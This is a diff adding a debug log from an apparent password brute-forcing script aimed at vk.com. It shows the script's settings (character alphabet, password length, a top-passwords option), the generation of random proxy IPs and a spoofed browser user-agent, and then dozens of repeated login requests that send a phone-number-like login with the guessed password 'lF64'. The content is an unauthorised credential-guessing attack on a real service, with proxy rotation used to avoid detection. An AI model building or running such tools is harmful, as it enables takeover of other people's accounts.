@@ -1,0 +1,199 @@
+2021-01-13 12:35:39,599 : INFO : proxies, char
+2021-01-13 12:35:39,641 : INFO : possible_head
+2021-01-13 12:35:39,643 : INFO : toppasswords
+2021-01-13 12:35:39,643 : DEBUG : run_of_questions = False
+2021-01-13 12:35:39,644 : DEBUG : len_of_password = 4
+2021-01-13 12:35:39,645 : DEBUG : alphabet = 0123456789abcdefjhigklmnopqrstuvwxyzABCDEFJHIGKLMNOPQRSTUVWXYZ
+2021-01-13 12:35:39,646 : DEBUG : dop_alphabet = ‡·‚„‰Â∏ÊÁËÍÎÏÌÓÔÒÚÛÙıˆ˜¯˘˙˚¸˝˛ˇ¿¡¬√ƒ≈®∆«» ÀÃÕŒœ–—“”‘’÷◊ÿŸ⁄€‹›ﬁﬂ
+2021-01-13 12:35:39,646 : DEBUG : string = 
+2021-01-13 12:35:39,647 : DEBUG : wrongpasswords = []
+2021-01-13 12:35:39,648 : INFO : Welcome!
+2021-01-13 12:35:39,649 : DEBUG : New class "InquiryFromUser"
+2021-01-13 12:35:39,649 : DEBUG : New class "Variables"
+2021-01-13 12:35:39,651 : INFO : Start program
+2021-01-13 12:35:39,652 : DEBUG : def "main"
+2021-01-13 12:35:41,539 : DEBUG : check = input('Do you want to restore the checkpoint?(y/n)
+').lower()
+2021-01-13 12:35:48,406 : INFO : Was entered "no checkpoint"
+2021-01-13 12:35:48,407 : DEBUG : password_0 = None, run_of_questions = True
+2021-01-13 12:35:48,408 : INFO : wrongpasswords = [], password_0 = None, run_of_questions = True
+2021-01-13 12:35:48,408 : INFO : return "wrongpasswords", "password_0", "run_of_questions"
+2021-01-13 12:35:48,409 : DEBUG : wrongpasswords = [], password_0 = None, run_of_questions = True
+2021-01-13 12:35:51,609 : DEBUG : loginner = 1
+2021-01-13 12:35:51,610 : DEBUG : "login_generator" is valid
+2021-01-13 12:35:51,611 : DEBUG : breaking
+2021-01-13 12:35:53,162 : DEBUG : passworder = 3
+2021-01-13 12:35:53,163 : DEBUG : "password_generator" is valid
+2021-01-13 12:35:53,164 : DEBUG : breaking
+2021-01-13 12:35:54,348 : DEBUG : new_liters = n
+2021-01-13 12:35:54,348 : DEBUG : Not added
+2021-01-13 12:35:54,349 : DEBUG : login_generator = 1, password_generator = 3
+2021-01-13 12:35:54,350 : INFO : variables(1, 3)
+2021-01-13 12:35:54,350 : DEBUG : def "login_list_with_random_choice"
+2021-01-13 12:35:54,351 : DEBUG : base = 62
+2021-01-13 12:35:54,352 : DEBUG : run_of_questions = True
+2021-01-13 12:35:54,353 : DEBUG : def "min_length"
+2021-01-13 12:35:55,499 : INFO : length_of_password = 
+2021-01-13 12:35:55,499 : WARNING : it's no number
+2021-01-13 12:35:55,500 : DEBUG : def "check"
+2021-01-13 12:35:55,501 : INFO : length = 4
+2021-01-13 12:35:55,501 : DEBUG : return "length"
+2021-01-13 12:35:55,502 : INFO : length was give in definition "check"
+2021-01-13 12:35:55,503 : INFO : 
+Set length(in characters) - 4
+
+2021-01-13 12:35:55,504 : DEBUG : return "length"
+2021-01-13 12:35:55,903 : INFO : file = 
+2021-01-13 12:35:55,903 : WARNING : File  not found
+2021-01-13 12:35:55,904 : DEBUG : return "wrongpasswords"
+2021-01-13 12:36:00,333 : DEBUG : length = 4, login = 89170050729, wrongpasswords complete
+2021-01-13 12:36:00,409 : DEBUG : "login" pickled
+2021-01-13 12:36:00,463 : DEBUG : password_0 = None
+2021-01-13 12:36:00,464 : DEBUG : k = 0, l = 1
+2021-01-13 12:36:00,487 : DEBUG : "login_generator" = 1 and "generate_password" = 3 write in file "variable.txt"
+2021-01-13 12:36:00,534 : DEBUG : def "random_choice"
+2021-01-13 12:36:00,535 : INFO : base = 62, password = 
+2021-01-13 12:36:00,541 : DEBUG : password = lF64
+2021-01-13 12:36:00,541 : DEBUG : many
+2021-01-13 12:36:00,542 : DEBUG : return "password" = "lF64", "length" = "4"
+2021-01-13 12:36:00,543 : DEBUG : password = lF64, length = 4
+2021-01-13 12:36:00,543 : DEBUG : Try request
+2021-01-13 12:36:00,544 : DEBUG : def "custom_server"
+2021-01-13 12:36:00,545 : DEBUG : def "proxy_generator"
+2021-01-13 12:36:00,545 : INFO : "stringproxy" complete
+2021-01-13 12:36:00,546 : INFO : proxy 1 complete
+2021-01-13 12:36:00,546 : DEBUG : char = 114
+2021-01-13 12:36:00,547 : DEBUG : stringproxy = ['114']
+2021-01-13 12:36:00,548 : DEBUG : char = 245
+2021-01-13 12:36:00,548 : DEBUG : stringproxy = ['114', '245']
+2021-01-13 12:36:00,549 : DEBUG : char = 185
+2021-01-13 12:36:00,549 : DEBUG : stringproxy = ['114', '245', '185']
+2021-01-13 12:36:00,550 : DEBUG : char = 174
+2021-01-13 12:36:00,551 : DEBUG : stringproxy = ['114', '245', '185', '174']
+2021-01-13 12:36:00,551 : DEBUG : stringproxy = 114.245.185.174
+2021-01-13 12:36:00,552 : DEBUG : proxies["http"] = 114.245.185.174
+2021-01-13 12:36:00,553 : INFO : proxy 2 complete
+2021-01-13 12:36:00,553 : DEBUG : char = 154
+2021-01-13 12:36:00,554 : DEBUG : stringproxy = ['154']
+2021-01-13 12:36:00,555 : DEBUG : char = 215
+2021-01-13 12:36:00,555 : DEBUG : stringproxy = ['154', '215']
+2021-01-13 12:36:00,556 : DEBUG : char = 231
+2021-01-13 12:36:00,557 : DEBUG : stringproxy = ['154', '215', '231']
+2021-01-13 12:36:00,557 : DEBUG : char = 192
+2021-01-13 12:36:00,558 : DEBUG : stringproxy = ['154', '215', '231', '192']
+2021-01-13 12:36:00,558 : DEBUG : proxies["https"] = 154.215.231.192
+2021-01-13 12:36:00,559 : DEBUG : head = Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.36; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)
+2021-01-13 12:36:00,560 : DEBUG : return "proxies", "head"
+2021-01-13 12:36:00,560 : DEBUG : headers = {'user-agent': 'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.36; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30618)'}
+2021-01-13 12:36:00,561 : DEBUG : status = False
+2021-01-13 12:36:00,561 : INFO : Requests
+2021-01-13 12:36:00,562 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:00,563 : DEBUG : trying request
+2021-01-13 12:36:05,576 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:08,221 : WARNING : Error
+2021-01-13 12:36:09,145 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:09,218 : DEBUG : trying request
+2021-01-13 12:36:09,309 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:09,476 : WARNING : Error
+2021-01-13 12:36:09,653 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:09,752 : DEBUG : trying request
+2021-01-13 12:36:09,865 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:10,035 : WARNING : Error
+2021-01-13 12:36:10,145 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:10,218 : DEBUG : trying request
+2021-01-13 12:36:10,309 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:10,481 : WARNING : Error
+2021-01-13 12:36:10,588 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:10,660 : DEBUG : trying request
+2021-01-13 12:36:10,763 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:10,931 : WARNING : Error
+2021-01-13 12:36:11,034 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:11,106 : DEBUG : trying request
+2021-01-13 12:36:11,202 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:11,369 : WARNING : Error
+2021-01-13 12:36:11,481 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:11,553 : DEBUG : trying request
+2021-01-13 12:36:11,647 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:11,996 : WARNING : Error
+2021-01-13 12:36:12,114 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:12,274 : DEBUG : trying request
+2021-01-13 12:36:12,394 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:12,684 : WARNING : Error
+2021-01-13 12:36:12,686 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:12,687 : DEBUG : trying request
+2021-01-13 12:36:13,225 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,228 : WARNING : Error
+2021-01-13 12:36:13,229 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,230 : DEBUG : trying request
+2021-01-13 12:36:13,301 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,304 : WARNING : Error
+2021-01-13 12:36:13,305 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,305 : DEBUG : trying request
+2021-01-13 12:36:13,377 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,380 : WARNING : Error
+2021-01-13 12:36:13,380 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,381 : DEBUG : trying request
+2021-01-13 12:36:13,453 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,456 : WARNING : Error
+2021-01-13 12:36:13,457 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,457 : DEBUG : trying request
+2021-01-13 12:36:13,518 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,521 : WARNING : Error
+2021-01-13 12:36:13,521 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,522 : DEBUG : trying request
+2021-01-13 12:36:13,595 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,598 : WARNING : Error
+2021-01-13 12:36:13,599 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,599 : DEBUG : trying request
+2021-01-13 12:36:13,672 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,675 : WARNING : Error
+2021-01-13 12:36:13,676 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,676 : DEBUG : trying request
+2021-01-13 12:36:13,747 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,750 : WARNING : Error
+2021-01-13 12:36:13,751 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,751 : DEBUG : trying request
+2021-01-13 12:36:13,822 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,824 : WARNING : Error
+2021-01-13 12:36:13,825 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,826 : DEBUG : trying request
+2021-01-13 12:36:13,893 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,899 : WARNING : Error
+2021-01-13 12:36:13,901 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,902 : DEBUG : trying request
+2021-01-13 12:36:13,970 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:13,973 : WARNING : Error
+2021-01-13 12:36:13,973 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:13,974 : DEBUG : trying request
+2021-01-13 12:36:14,052 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:14,055 : WARNING : Error
+2021-01-13 12:36:14,056 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:14,056 : DEBUG : trying request
+2021-01-13 12:36:14,117 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:14,120 : WARNING : Error
+2021-01-13 12:36:14,121 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:14,122 : DEBUG : trying request
+2021-01-13 12:36:14,194 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:14,197 : WARNING : Error
+2021-01-13 12:36:14,198 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:14,199 : DEBUG : trying request
+2021-01-13 12:36:14,266 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:14,269 : WARNING : Error
+2021-01-13 12:36:14,270 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:14,272 : DEBUG : trying request
+2021-01-13 12:36:14,340 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:14,343 : WARNING : Error
+2021-01-13 12:36:14,344 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:14,345 : DEBUG : trying request
+2021-01-13 12:36:14,416 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:14,419 : WARNING : Error
+2021-01-13 12:36:14,420 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:14,420 : DEBUG : trying request
+2021-01-13 12:36:14,491 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:14,494 : WARNING : Error
+2021-01-13 12:36:14,495 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:14,495 : DEBUG : trying request
+2021-01-13 12:36:14,565 : DEBUG : Starting new HTTPS connection (1): vk.com:443
+2021-01-13 12:36:14,570 : WARNING : Error
+2021-01-13 12:36:14,571 : DEBUG : payload = {'email': '89170050729', 'pass': 'lF64'}
+2021-01-13 12:36:14,571 : DEBUG : trying request
